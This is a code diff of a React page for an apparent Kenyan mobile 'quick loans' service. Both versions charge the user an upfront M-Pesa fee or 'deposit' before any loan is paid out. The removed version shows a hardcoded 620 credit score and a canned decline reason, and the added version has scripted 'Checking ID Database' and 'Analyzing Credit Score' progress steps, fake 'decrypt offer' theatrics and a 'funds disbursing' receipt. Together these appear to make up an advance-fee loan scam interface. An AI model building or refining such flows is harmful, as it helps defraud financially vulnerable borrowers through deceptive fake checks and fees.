-                        <div className="h-full bg-emerald-500 w-[85%] rounded-full"></div>
-                    </div>
-                    <div className="flex justify-between text-[10px] font-bold text-slate-400">
-                         <span>Min: 5,000</span>
-                         <span>Max: 60,000</span>
-                    </div>
-                </div>
-
-                <Button 
-                    onClick={() => { setStep('select'); window.scrollTo(0,0); }}
-                    className="w-full h-14 bg-emerald-500 hover:bg-emerald-400 text-white font-bold text-lg rounded-xl shadow-xl shadow-emerald-500/20 transition-transform hover:-translate-y-0.5"
-                >
-                    Select Loan Amount
-                </Button>
-             </div>
-        </div>
-      )}
-
-      {/* ================= STEP 4: TIER SELECTION ================= */}
-      {step === 'select' && (
-        <div className="animate-in slide-in-from-right duration-500">
-             <div className="text-center mb-8">
-                <h2 className="text-2xl font-black text-slate-900 tracking-tight">Select Amount</h2>
-                <p className="text-slate-500 font-medium">Choose a loan package that fits your needs.</p>
+      {/* 2. ANALYZING */}
+      {step === 'analyzing' && (
+         <div className="fixed inset-0 bg-white z-[60] flex flex-col items-center justify-center p-8">
+            <div className="w-full max-w-xs space-y-6">
+               <div className="flex justify-center mb-8"><div className="relative w-24 h-24"><svg className="w-full h-full" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="none" stroke="#e2e8f0" strokeWidth="8" /><circle cx="50" cy="50" r="45" fill="none" stroke="#059669" strokeWidth="8" strokeDasharray="283" strokeDashoffset={283 - (283 * (analysisStep + 1) / 4)} className="transition-all duration-1000 ease-linear" transform="rotate(-90 50 50)" /></svg></div></div>
+               <div className="bg-slate-50 p-6 rounded-2xl border border-slate-100 space-y-4">
+                  {["Checking ID Database", "Verifying M-Pesa Status", "Analyzing Credit Score", "Preparing Offer"].map((label, i) => (
+                     <div key={i} className="flex items-center gap-3"><div className={`w-5 h-5 rounded-full flex items-center justify-center border-2 ${i < analysisStep ? 'bg-emerald-500 border-emerald-500 text-white' : i === analysisStep ? 'border-emerald-500 text-emerald-500 animate-pulse' : 'border-slate-300 text-transparent'}`}>{i < analysisStep && <CheckCircle2 className="w-3 h-3" />}</div><span className={`text-sm font-medium ${i <= analysisStep ? 'text-slate-900' : 'text-slate-400'}`}>{label}</span></div>
+                  ))}
+               </div>
             </div>
-
-            <div className="space-y-4">
-                {LOAN_TIERS.map((tier) => (
-                    <button
-                        key={tier.amount}
-                        onClick={() => { setSelectedTier(tier); setStep('summary'); window.scrollTo(0,0); }}
-                        className="w-full bg-white rounded-xl p-5 border border-slate-100 hover:border-emerald-500 hover:shadow-lg hover:shadow-emerald-500/10 transition-all text-left flex items-center justify-between group relative overflow-hidden"
-                    >
-                        <div className="relative z-10">
-                            <div className="text-2xl font-black text-slate-900 tracking-tight group-hover:text-emerald-600 transition-colors">
-                                KES {tier.amount.toLocaleString()}
-                            </div>
-                            <div className="text-xs font-bold text-slate-400 mt-1">
-                                Repay: KES {(tier.amount + tier.fee).toLocaleString()}
-                            </div>
-                        </div>
-                        
-                        <div className="relative z-10 text-right">
-                            <div className="text-[10px] font-bold uppercase text-blue-600 bg-blue-50 px-3 py-1.5 rounded-lg mb-1 group-hover:bg-emerald-50 group-hover:text-emerald-600 transition-colors">
-                                Fee: KES {tier.fee}
-                            </div>
-                        </div>
-                        
-                        <div className="absolute inset-0 bg-slate-50 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
-                    </button>
-                ))}
-            </div>
-        </div>
-      )}
-
-      {/* ================= STEP 5: SUMMARY ================= */}
-      {step === 'summary' && selectedTier && (
-        <div className="animate-in slide-in-from-bottom-4 duration-500">
-            <div className="bg-white rounded-xl shadow-2xl border border-slate-100 overflow-hidden">
-                <div className="bg-slate-900 p-6 text-white text-center">
-                    <h2 className="text-lg font-bold">Secure Your Loan</h2>
-                    <p className="text-slate-400 text-xs mt-1">Complete the final step.</p>
-                </div>
-
-                <div className="p-6">
-                    <div className="space-y-4 border-b border-slate-100 pb-6 mb-6">
-                         <div className="flex justify-between items-center">
-                            <span className="text-slate-500 text-sm font-bold uppercase">Borrower</span>
-                            <span className="text-slate-900 font-bold text-sm">{details.fullName}</span>
-                        </div>
-                        <div className="flex justify-between items-center">
-                            <span className="text-slate-500 text-sm font-bold uppercase">Purpose</span>
-                            <div className="px-2 py-1 bg-slate-100 rounded text-xs font-bold text-slate-700">
-                                {details.purpose}
-                            </div>
-                        </div>
-                        <div className="h-px bg-slate-50 my-2"></div>
-                        <div className="flex justify-between items-center">
-                            <span className="text-slate-900 font-bold">Loan Amount</span>
-                            <span className="text-2xl font-black text-slate-900 tracking-tight">KES {selectedTier.amount.toLocaleString()}</span>
-                        </div>
-                        
-                        <div className="bg-blue-50/80 p-4 rounded-xl border border-blue-100 space-y-2">
-                             <div className="flex justify-between items-center">
-                                <span className="text-blue-900 font-bold text-xs uppercase tracking-wide">Processing Fee</span>
-                                <span className="text-blue-900 font-black text-lg">KES {selectedTier.fee}</span>
-                            </div>
-                            <div className="flex gap-2 items-start">
-                                <Info className="w-3 h-3 text-blue-600 mt-0.5 shrink-0" />
-                                <p className="text-[10px] text-blue-700 font-medium leading-tight">
-                                    <span className="font-bold">CRB Verification</span> Mandatory background check fee.
-                                </p>
-                            </div>
-                        </div>
-                        
-                        <div className="flex justify-between text-xs pt-2">
-                            <span className="text-slate-400 font-medium">Tracking ID</span>
-                            <span className="text-slate-500 font-mono tracking-wide">{trackingId}</span>
-                        </div>
-                    </div>
-
-                    <Button 
-                        onClick={handlePayment}
-                        disabled={isProcessing}
-                        className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-white font-black text-lg rounded-xl shadow-xl shadow-emerald-500/20 transition-transform hover:-translate-y-0.5"
-                    >
-                        {isProcessing ? (
-                            <div className="flex items-center gap-2">
-                                <Loader2 className="w-5 h-5 animate-spin" />
-                                <span>Processing...</span>
-                            </div>
-                        ) : (
-                            <span>Pay KES {selectedTier.fee}</span>
-                        )}
-                    </Button>
-                    
-                    <button 
-                        onClick={() => setStep('select')} 
-                        className="w-full text-center mt-6 text-xs font-bold text-slate-400 hover:text-slate-600 transition-colors"
-                    >
-                        Select a different amount
-                    </button>
-                </div>
-            </div>
-        </div>
-      )}
-
-      {/* ================= STEP 6: STK PUSH ================= */}
-      {step === 'stk_push' && selectedTier && (
-        <div className="animate-in zoom-in-95 duration-500 pt-10 text-center max-w-sm mx-auto">
-             <div className="bg-white p-8 rounded-xl shadow-2xl border border-slate-50 relative overflow-hidden">
-                <div className="w-24 h-24 bg-emerald-50 rounded-full flex items-center justify-center mx-auto mb-6 relative">
-                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-20"></span>
-                    <Smartphone className="w-10 h-10 text-emerald-600 relative z-10" />
-                </div>
-                
-                <h2 className="text-2xl font-bold text-slate-900 mb-2 tracking-tight">Check Your Phone</h2>
-                <p className="text-slate-500 font-medium mb-6 leading-relaxed">
-                    Enter PIN to pay <span className="text-emerald-600 font-bold">KES {selectedTier.fee}</span>.
-                </p>
-
-                <div className="bg-slate-50 rounded-xl p-4 mb-4 border border-slate-100">
-                    <div className="flex justify-between items-center mb-3">
-                        <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wide">Status</span>
-                        <span className="text-[10px] font-bold text-emerald-600 bg-emerald-100 px-3 py-1 rounded-full animate-pulse">
-                            {pollMessage}
-                        </span>
-                    </div>
-                    <div className="w-full bg-slate-200 rounded-full h-2 overflow-hidden">
-                        <div className="h-full bg-emerald-500 animate-[width_240s_ease-in-out_forwards]" style={{width: '90%'}}></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-      )}
-
-      {/* ================= STEP 7: RECEIPT BRIDGE ================= */}
-      {step === 'payment_verified' && (
-        <div className="pt-10 px-4 animate-in zoom-in-95 duration-500">
-            <div className="bg-white rounded-2xl shadow-xl border border-slate-100 overflow-hidden relative">
-              {/* Receipt Rip Effect */}
-              <div className="absolute top-0 left-0 w-full h-2 mask-radial bg-slate-100 opacity-50"></div>
-              
-              <div className="p-8 text-center">
-                <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-4 relative">
-                   <div className="absolute inset-0 rounded-full bg-emerald-200 opacity-20 animate-ping"></div>
-                   <CheckCircle2 className="w-8 h-8 text-emerald-600 relative z-10" />
-                </div>
-                <h2 className="text-xl font-black text-slate-900 mb-1">Fee Received</h2>
-                <p className="text-xs text-slate-500 font-medium mb-6">Payment verified via M-Pesa.</p>
-
-                {/* The Digital Receipt */}
-                <div className="bg-slate-50 rounded-lg border border-slate-200 p-4 text-left space-y-3 font-mono text-xs mb-6 relative overflow-hidden">
-                  <div className="flex justify-between border-b border-slate-200 pb-2">
-                    <span className="text-slate-500">Receipt No:</span>
-                    <span className="font-bold text-slate-900">{mpesaReceipt}</span>
-                  </div>
-                  <div className="flex justify-between border-b border-slate-200 pb-2">
-                    <span className="text-slate-500">Service:</span>
-                    <span className="font-bold text-slate-900">CRB Check</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="text-slate-500">Amount:</span>
-                    <span className="font-bold text-emerald-600">KES {selectedTier?.fee}</span>
-                  </div>
-                </div>
-
-                <Button 
-                  onClick={() => startAnalysis()}
-                  className="w-full h-12 bg-slate-900 text-white font-bold rounded-xl shadow-lg transition-transform hover:-translate-y-1"
-                >
-                  Proceed to CRB Check
-                </Button>
-              </div>
-            </div>
-        </div>
-      )}
-
-      {/* ================= STEP 8: CRB ANIMATION ================= */}
-      {step === 'analyzing_crb' && (
-            <div className="pt-20 text-center space-y-6 animate-in fade-in duration-700 px-6">
-                <div className="relative w-20 h-20 mx-auto">
-                   <div className="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
-                   <div className="absolute inset-0 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin"></div>
-                   <ShieldCheck className="absolute inset-0 m-auto w-8 h-8 text-emerald-600 animate-pulse" />
-                </div>
-                <div>
-                   <h2 className="text-2xl font-black text-slate-900 mb-2">Analyzing Credit</h2>
-                   <p className="text-sm font-bold text-emerald-600 animate-pulse">{loadingText}</p>
-                </div>
-                <div className="w-full bg-slate-100 rounded-full h-2 overflow-hidden">
-                    <div className="h-full bg-emerald-500 transition-all duration-300 ease-out" style={{ width: `${analysisProgress}%` }}></div>
-                </div>
-            </div>
-      )}
-
-      {/* ================= STEP 9: SUCCESS (OPTIMISTIC) ================= */}
-      {step === 'success' && selectedTier && (
-         <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
-             <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                <CheckCircle2 className="w-10 h-10 text-emerald-600" />
-            </div>
-            
-            <h2 className="text-2xl font-bold text-slate-900 mb-2 tracking-tight">Application Submitted!</h2>
-            <p className="text-slate-500 font-medium mb-8 px-4 leading-relaxed">
-                Your request for <span className="text-slate-900 font-bold">KES {selectedTier.amount.toLocaleString()}</span> is now under priority review.
-            </p>
-            
-            <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 text-left mb-6 space-y-6">
-                 {/* Step 1: Fee - Done */}
-                 <div className="flex gap-4">
-                     <div className="w-8 h-8 bg-emerald-500 text-white rounded-full flex items-center justify-center font-bold text-sm shrink-0">
-                         <Check className="w-4 h-4" />
-                     </div>
-                     <div>
-                         <h4 className="font-bold text-slate-900 text-sm">Fee Verified</h4>
-                         <p className="text-xs text-slate-500 mt-0.5">Receipt: {mpesaReceipt}</p>
-                     </div>
-                 </div>
-
-                 {/* Step 2: CRB - Pending */}
-                 <div className="flex gap-4">
-                     <div className="w-8 h-8 bg-yellow-100 text-yellow-600 rounded-full flex items-center justify-center font-bold text-sm shrink-0 animate-pulse">
-                         <FileClock className="w-4 h-4" />
-                     </div>
-                     <div>
-                         <h4 className="font-bold text-slate-900 text-sm">Disbursement Queue</h4>
-                         <p className="text-xs text-slate-500 mt-0.5 leading-relaxed">
-                            Final review in progress. Funds usually disbursed within 24 hours.
-                         </p>
-                     </div>
-                 </div>
-
-                 <div className="pt-4 border-t border-slate-50">
-                    <p className="text-[10px] text-slate-400 uppercase font-bold mb-2 tracking-wide text-center">Tracking ID (Save This)</p>
-                    <div className="font-mono text-sm font-bold text-slate-700 bg-slate-100 p-3 rounded-xl text-center select-all border border-slate-200">
-                        {trackingId}
-                    </div>
-                 </div>
-            </div>
-
-            <Button onClick={() => router.push('/')} className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg">
-                Return Home
-            </Button>
          </div>
       )}
 
-      {/* ================= STEP 9.5: REJECTED (High Amount) ================= */}
-      {step === 'high_limit_reject' && selectedTier && (
-             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
-                <div className="w-20 h-20 bg-slate-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                    <Ban className="w-10 h-10 text-slate-500" />
-                </div>
-                
-                <h2 className="text-2xl font-black text-slate-900 mb-2">Loan Declined</h2>
-                <div className="bg-red-50 text-red-700 text-xs font-bold px-4 py-2 rounded-full inline-block mb-6">
-                    CRB Check Completed • Score Too Low
-                </div>
-                
-                {/* FINANCIAL REPORT FOR LOAN */}
-                <div className="bg-white rounded-2xl shadow-xl border border-slate-100 overflow-hidden mb-6 text-left">
-                  <div className="bg-slate-50 p-4 border-b border-slate-100 flex justify-between items-center">
-                     <span className="text-xs font-bold text-slate-500 uppercase">Credit Report</span>
-                     <span className="text-[10px] font-mono text-slate-400">REF: {mpesaReceipt}</span>
-                  </div>
-                  
-                  <div className="p-6">
-                     <div className="text-center mb-6">
-                        <div className="inline-flex items-center justify-center w-28 h-28 rounded-full border-8 border-slate-100 border-t-red-500 transform -rotate-45 relative">
-                           <div className="transform rotate-45 text-center absolute inset-0 flex flex-col items-center justify-center">
-                              <span className="block text-3xl font-black text-slate-900">620</span>
-                              <span className="block text-[10px] text-red-500 font-bold uppercase">Poor</span>
-                           </div>
-                        </div>
-                        <p className="text-xs text-slate-500 mt-4">Unsecured loan requirement: <span className="font-bold text-slate-900">700+</span></p>
-                     </div>
-
-                     <div className="bg-slate-50 p-3 rounded-lg border border-slate-100">
-                         <h4 className="font-bold text-slate-900 text-[10px] uppercase mb-1">Reason for Decline</h4>
-                         <p className="text-[10px] text-slate-500 leading-relaxed">
-                             High debt-to-income ratio detected. Active loans found on other mobile lending platforms.
-                         </p>
-                     </div>
-                  </div>
-                </div>
-
-                <div className="space-y-3">
-                    <Button onClick={() => setStep('select')} className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg">
-                        Apply for Lower Amount
-                    </Button>
-                </div>
+      {/* 3. OTP */}
+      {step === 'otp' && (
+         <div className="max-w-md mx-auto p-4 pt-10 animate-in zoom-in-95">
+             <div className="bg-white p-6 rounded-2xl shadow-xl border-t-4 border-blue-900">
+                <h2 className="text-xl font-black text-slate-900 mb-2">Verify Phone</h2>
+                <p className="text-sm text-slate-500 mb-6">Enter code sent to {formData.phone}</p>
+                <form onSubmit={handleOtpSubmit}><div className="flex gap-3 justify-center mb-8">{otpInput.map((val, i) => (<input key={i} id={`otp-${i}`} type="tel" maxLength={1} value={val} onChange={(e) => { const n = [...otpInput]; n[i] = e.target.value; setOtpInput(n); if(e.target.value && i < 3) document.getElementById(`otp-${i+1}`)?.focus(); }} className="w-14 h-14 border-2 border-slate-200 rounded-xl text-center text-2xl font-black text-slate-900 focus:border-blue-900 outline-none" />))}</div><Button className="w-full h-12 bg-slate-900 text-white font-bold rounded-xl">Confirm</Button></form>
              </div>
-        )}
-
-      {/* ================= STEP 10: RECOVERY/FAILED ================= */}
-      {step === 'payment_check' && selectedTier && (
-          <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
-            <div className="w-20 h-20 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-6">
-              <SearchCheck className="w-10 h-10 text-yellow-600" />
-            </div>
-            <h2 className="text-2xl font-black text-slate-900 mb-2">Checking Payment</h2>
-            <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6 space-y-4">
-              {errorMsg && <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold"><AlertCircle className="w-4 h-4" /> {errorMsg}</div>}
-              <Button onClick={handleManualFetch} disabled={manualCheckLoading} className="w-full h-14 bg-emerald-600 text-white font-bold rounded-xl shadow-lg flex items-center justify-center gap-2">
-                  {manualCheckLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : <SearchCheck className="w-5 h-5" />}
-                  <span>Verify Again</span>
-              </Button>
-              <Button onClick={handleRetrySamePayment} variant="outline" className="w-full h-14 border-2 font-bold rounded-xl"><RefreshCcw className="w-4 h-4 mr-2" /> Retry</Button>
-            </div>
-          </div>
+         </div>
       )}
 
-      {step === 'failed' && selectedTier && (
-         <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
-             <div className="w-20 h-20 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-6"><XCircle className="w-10 h-10 text-orange-500" /></div>
-            <h2 className="text-2xl font-bold text-slate-900 mb-2">Payment Cancelled</h2>
-            <p className="text-slate-500 font-medium mb-8 px-4">Fee of <span className="font-bold text-slate-900">KES {selectedTier.fee}</span> was not received.</p>
-            <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6">
-                <Button onClick={() => setStep('summary')} className="w-full h-12 bg-emerald-500 text-white font-bold rounded-xl flex items-center justify-center gap-2 shadow-lg"><RefreshCcw className="w-4 h-4" /> Retry Payment</Button>
-            </div>
+      {/* 4. KYC */}
+      {step === 'kyc_details' && (
+         <div className="max-w-md mx-auto p-4 pt-8 animate-in slide-in-from-right">
+             <div className="bg-white p-6 rounded-2xl shadow-xl border border-slate-200">
+                <h2 className="text-lg font-black text-slate-900 mb-4">Application Details</h2>
+                <form onSubmit={handleKycSubmit} className="space-y-4">
+                   <div><label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Full Name</label><input type="text" className="w-full h-12 px-4 border border-slate-300 rounded-xl font-bold uppercase outline-none focus:border-blue-600" value={formData.fullName} onChange={e => setFormData({...formData, fullName: e.target.value})} required /></div>
+                   <div><label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Loan Purpose</label><select className="w-full h-12 px-4 border border-slate-300 rounded-xl font-bold bg-white outline-none" value={formData.purpose} onChange={e => setFormData({...formData, purpose: e.target.value})}><option>Business Stock</option><option>School Fees</option><option>Emergency</option></select></div>
+                   <div className="grid grid-cols-2 gap-3">
+                      <div><label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Amount</label><input type="text" className="w-full h-12 px-4 border border-slate-300 rounded-xl font-bold font-mono outline-none focus:border-blue-600" value={formData.reqAmount} onChange={handleAmount} required /></div>
+                      <div><label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Duration</label><select className="w-full h-12 px-2 border border-slate-300 rounded-xl font-bold bg-white outline-none" value={formData.duration} onChange={e => setFormData({...formData, duration: e.target.value})}><option value="30">30 Days</option><option value="60">60 Days</option></select></div>
+                   </div>
+                   <Button className="w-full h-14 bg-emerald-600 text-white font-bold text-lg rounded-xl mt-2">Check Approval</Button>
+                </form>
+             </div>
+         </div>
+      )}
+
+      {/* 5. BLUR REVEAL */}
+      {step === 'blur_reveal' && (
+         <div className="max-w-md mx-auto p-4 pt-10 animate-in zoom-in-95">
+             <div className="bg-slate-900 rounded-2xl shadow-2xl overflow-hidden border border-slate-800 relative">
+                <div className="p-8 text-center text-white">
+                   <div className="w-20 h-20 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-6 relative group cursor-pointer" onClick={handleReveal}><div className="absolute inset-0 rounded-full border-2 border-emerald-500/30 animate-ping"></div><Fingerprint className="w-10 h-10 text-emerald-400" /></div>
+                   <h2 className="text-xl font-bold mb-2">Offer Secured</h2>
+                   <p className="text-sm text-slate-400 mb-8">Tap fingerprint to decrypt offer.</p>
+                   <Button onClick={handleReveal} className="w-full h-14 bg-emerald-600 text-white font-bold text-lg rounded-xl"><Unlock className="w-5 h-5 mr-2" /> Decrypt & Reveal</Button>
+                </div>
+             </div>
+         </div>
+      )}
+
+      {/* 6. OFFER SELECT (>5k) */}
+      {step === 'offer_select' && (
+         <div className="max-w-md mx-auto p-4 pt-6 animate-in slide-in-from-right">
+            {isHighRequest && <div className="bg-orange-50 border border-orange-200 p-3 rounded-xl mb-4 flex gap-3 items-start"><AlertCircle className="w-5 h-5 text-orange-600 shrink-0" /><div><h3 className="text-sm font-bold text-orange-800">Limit Adjusted</h3><p className="text-xs text-orange-700">Request adjusted based on CRB score.</p></div></div>}
+            <h2 className="text-xl font-black text-slate-900 mb-4 px-2">Select Option</h2>
+            <div className="space-y-4">{STANDARD_TIERS.map((tier) => (<div key={tier.amount} onClick={() => { setSelectedOffer(tier); setStep('summary'); }} className="bg-white p-5 rounded-2xl border-2 border-slate-100 hover:border-emerald-500 cursor-pointer shadow-sm relative group overflow-hidden transition-all hover:scale-[1.02]"><div className="flex justify-between items-center mb-2"><span className="text-xs font-bold text-slate-500 uppercase tracking-wider">{tier.label}</span><span className="text-[10px] font-bold bg-blue-50 text-blue-700 px-2 py-1 rounded">{tier.days} Days</span></div><div className="flex justify-between items-end"><span className="text-3xl font-black text-slate-900">KES {tier.amount.toLocaleString()}</span><ChevronRight className="w-6 h-6 text-slate-300 group-hover:text-emerald-500" /></div></div>))}</div>
+         </div>
+      )}
+
+      {/* 7. SUMMARY */}
+      {step === 'summary' && selectedOffer && (
+         <div className="max-w-md mx-auto p-4 pt-6 animate-in slide-in-from-right">
+             <div className="bg-white rounded-2xl shadow-xl border border-slate-200 overflow-hidden">
+                <div className="bg-slate-900 text-white p-4 flex justify-between items-center"><span className="font-bold">Contract Summary</span><FileText className="w-5 h-5 text-emerald-400" /></div>
+                <div className="p-6 space-y-4">
+                   <div className="bg-slate-50 p-4 rounded-xl border border-slate-100 space-y-2">
+                      <div className="flex justify-between"><span className="text-xs font-bold text-slate-400">Applicant</span><span className="text-sm font-black text-slate-900 uppercase">{formData.fullName}</span></div>
+                      <div className="flex justify-between"><span className="text-xs font-bold text-slate-400">Phone</span><span className="text-xs font-mono font-bold text-slate-600">{formData.phone}</span></div>
+                   </div>
+                   <div className="space-y-3 pb-4 border-b border-dashed border-slate-200">
+                      <div className="flex justify-between text-sm"><span className="text-slate-600">Principal</span><span className="font-bold text-slate-900">KES {selectedOffer.amount.toLocaleString()}</span></div>
+                      <div className="flex justify-between text-sm"><span className="text-slate-600">Interest (15%)</span><span className="font-bold text-slate-900">KES {(selectedOffer.amount * INTEREST_RATE).toLocaleString()}</span></div>
+                      <div className="flex justify-between text-sm border-t pt-2"><span className="font-black text-slate-900">Total Repayment</span><span className="font-black text-blue-900">KES {(selectedOffer.amount * 1.15).toLocaleString()}</span></div>
+                   </div>
+                   {/* Wallet Credit Logic */}
+                   <div className="bg-emerald-50 rounded-xl p-4 border border-emerald-100"><div className="flex justify-between items-center mb-2 pb-2 border-b border-emerald-200/50"><span className="text-xs font-bold text-emerald-800 uppercase">Wallet Deposit</span><span className="text-lg font-black text-red-500">- KES {selectedOffer.fee}</span></div><div className="flex justify-between items-end"><div><p className="text-[10px] font-bold text-emerald-700 uppercase">Net Disbursement</p><p className="text-[9px] text-emerald-600">Instant Transfer</p></div><span className="text-2xl font-black text-emerald-700">KES {(selectedOffer.amount - selectedOffer.fee).toLocaleString()}</span></div></div>
+                   <div className="flex gap-3 items-start p-3 bg-yellow-50 rounded-lg border border-yellow-100"><Wallet className="w-4 h-4 text-yellow-600 shrink-0 mt-0.5" /><p className="text-[10px] text-yellow-800">Deposit of <strong>KES {selectedOffer.fee}</strong> is required. This is <strong>credited to your loan wallet</strong> as an early repayment.</p></div>
+                   <label className="flex gap-3 items-center cursor-pointer group p-2 hover:bg-slate-50 rounded-lg"><input type="checkbox" checked={prepChecked} onChange={e => setPrepChecked(e.target.checked)} className="w-5 h-5 rounded border-slate-300" /><span className="text-xs text-slate-600 font-bold">I agree to Terms & Conditions.</span></label>
+                   <Button onClick={initiateSTK} disabled={!prepChecked} className="w-full h-14 bg-blue-900 hover:bg-blue-800 text-white font-bold text-lg rounded-xl shadow-lg disabled:opacity-50">Activate Loan Limit</Button>
+                </div>
+             </div>
+         </div>
+      )}
+
+      {/* 8. CONNECTING / STK PUSH */}
+      {(step === 'connecting' || step === 'stk_push') && (
+         <div className="fixed inset-0 bg-slate-900/95 z-[70] flex flex-col items-center justify-center p-6 text-center">
+             <div className="w-24 h-24 bg-emerald-500/20 rounded-full flex items-center justify-center mb-6 relative">
+                <div className="absolute inset-0 border-4 border-emerald-500/50 rounded-full animate-ping"></div>
+                {step === 'connecting' ? <Zap className="w-10 h-10 text-emerald-400" /> : <Smartphone className="w-10 h-10 text-emerald-400 animate-pulse" />}
+             </div>
+             <h2 className="text-2xl font-black text-white mb-2">{step === 'connecting' ? 'Secure Link...' : 'Check Your Phone'}</h2>
+             <p className="text-emerald-400 font-bold mb-8 animate-pulse text-sm">{step === 'connecting' ? connectStatus : `Enter PIN to Deposit KES ${selectedOffer.fee}`}</p>
+         </div>
+      )}
+
+      {/* 9. RECEIPT */}
+      {step === 'receipt' && receipt && (
+         <div className="max-w-md mx-auto p-4 pt-10 animate-in zoom-in-95">
+             <div className="bg-white rounded-2xl shadow-2xl overflow-hidden border border-slate-200 relative">
+                <div className="absolute top-0 left-0 w-full h-2 bg-emerald-500"></div>
+                <div className="p-8 text-center">
+                   <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-4 relative"><CheckCircle2 className="w-8 h-8 text-emerald-600 relative z-10" /></div>
+                   <h2 className="text-xl font-black text-slate-900 mb-1">Limit Active</h2>
+                   <p className="text-xs text-slate-500 font-medium mb-6">Deposit Verified. Funds Disbursing.</p>
+                   <div className="bg-slate-50 border border-slate-200 rounded-xl p-4 font-mono text-xs text-left space-y-3 mb-4 relative">
+                      <div className="flex justify-between border-b border-slate-200 pb-2"><span className="text-slate-500">M-Pesa Ref:</span><span className="font-bold text-slate-900">{receipt.code}</span></div>
+                      <div className="flex justify-between border-b border-slate-200 pb-2"><span className="text-slate-500">Tracking ID:</span><span className="font-bold text-blue-600">{receipt.trackId}</span></div>
+                      <div className="flex justify-between"><span className="text-slate-500">Status:</span><span className="font-bold text-emerald-600">Processing</span></div>
+                   </div>
+                   <p className="text-[10px] text-slate-400 mb-6">* Save your Tracking ID.</p>
+                   <div className="space-y-3"><Link href="/quick-loans-test/track"><Button className="w-full h-12 bg-slate-900 text-white font-bold rounded-xl shadow-lg">Track Disbursement</Button></Link><Link href="/quick-loans-test/chat"><Button variant="outline" className="w-full h-12 border-slate-200 font-bold rounded-xl hover:bg-slate-50 text-slate-600"><MessageSquare className="w-4 h-4 mr-2" /> Contact Support</Button></Link></div>
+                </div>
+             </div>
+         </div>
+      )}
+
+      {/* 10. FAILED */}
+      {step === 'failed' && (
+         <div className="max-w-md mx-auto p-4 pt-20 text-center animate-in zoom-in-95">
+             <div className="w-20 h-20 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-6"><RefreshCw className="w-10 h-10 text-orange-500" /></div>
+             <h2 className="text-xl font-black text-slate-900 mb-2">{failReason === 'CANCEL' ? 'Request Cancelled' : 'Connection Failed'}</h2>
+             <p className="text-sm text-slate-500 mb-8 px-6">We could not secure the connection. Please retry the activation request.</p>
+             <Button onClick={initiateSTK} className="w-full h-14 bg-blue-900 text-white font-bold rounded-xl shadow-lg">Retry Activation</Button>
          </div>
       )}
     </div>
   );
-}
-
-export default function QuickLoansPage() {
-    return (
-        <div className="min-h-screen bg-slate-50/50 font-sans text-slate-900">
-            <Suspense fallback={<div className="p-10 text-center"><Loader2 className="animate-spin w-8 h-8 mx-auto text-slate-300"/></div>}>
-                <QuickLoansContent />
-            </Suspense>
-        </div>
-    )
 }
